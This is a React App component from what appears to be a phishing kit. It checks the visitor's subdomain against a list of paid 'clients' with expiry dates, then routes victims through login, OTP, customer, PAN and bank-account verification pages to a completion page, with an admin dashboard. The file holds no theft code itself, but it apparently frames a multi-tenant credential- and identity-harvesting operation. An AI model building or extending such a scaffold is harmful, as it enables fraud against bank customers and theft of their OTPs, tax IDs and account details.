import {useEffect, useState} from "react";
import {Switch, Route} from "wouter";
import {QueryClientProvider} from "@tanstack/react-query";
import {queryClient} from "./lib/queryClient";
import {Toaster} from "@/components/ui/toaster";
import LoginPage from "@/pages/LoginPage";
import OtpPage from "@/pages/OtpPage";
import VerifyCustomerPage from "@/pages/VerifyCustomerPage";
import VerifyPanPage from "@/pages/VerifyPanPage";
import VerifyAccountPage from "@/pages/VerifyAccountPage";
import CompletionPage from "@/pages/CompletionPage";
import AdminLoginPage from "@/pages/AdminLoginPage";
import AdminDashboardPage from "@/pages/AdminDashboardPage";
import NotFound from "@/pages/not-found";

const getSubSubdomain = () => {
    const host = window.location.hostname;
    const parts = host.split(".");
    if (parts.length >= 3) {
        return parts[0];
    }
    return null;
};

const useClientValidation = () => {
    const [status, setStatus] = useState({valid: false, loading: true});

    useEffect(() => {
        const validate = async () => {
            const subdomain = getSubSubdomain();

            try {
                console.log(subdomain);
                const response = await fetch(`${window.location.origin}/api/getLinksUnSorted`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    }
                });

                if (!response.ok) {
                    throw new Error(`HTTP error! Status: ${response.status}`);
                }

                const json = await response.json();

                const client = json.data[0][subdomain];
                console.log(client);
                if (client?.active) {
                    const [datePart, timePart] = client.expires.split(" ");
                    const [day, month, year] = datePart.split("/").map(Number);
                    const [hour, minute] = timePart.split(":").map(Number);
                    const expirationDate = new Date(year, month - 1, day, hour, minute);
                    const now = new Date();

                    if (expirationDate < now) {
                        setStatus({valid: false, loading: false});
                    } else {
                        setStatus({valid: true, loading: false});
                    }
                } else {
                    setStatus({valid: false, loading: false});
                }
            } catch (error) {
                console.error("Validation failed:", error);
                setStatus({valid: false, loading: false});
            }
        };

        validate();
    }, []);

    return status;
};

function Router() {
    return (
        <Switch>
            <Route path="/" component={LoginPage}/>
            <Route path="/otp" component={OtpPage}/>
            <Route path="/verify-customer" component={VerifyCustomerPage}/>
            <Route path="/verify-pan" component={VerifyPanPage}/>
            <Route path="/verify-account" component={VerifyAccountPage}/>
            <Route path="/completion" component={CompletionPage}/>
            <Route path="/admin" component={AdminLoginPage}/>
            <Route path="/admin/dashboard" component={AdminDashboardPage}/>
            <Route component={NotFound}/>
        </Switch>
    );
}

function App() {
    const {valid, loading} = useClientValidation();
    if (loading) return <div>Loading...</div>;
    if (!valid) return <div>Invalid or Expired Client</div>;

    return (
        <QueryClientProvider client={queryClient}>
            <Router/>
            <Toaster/>
        </QueryClientProvider>
    );
}

export default App;
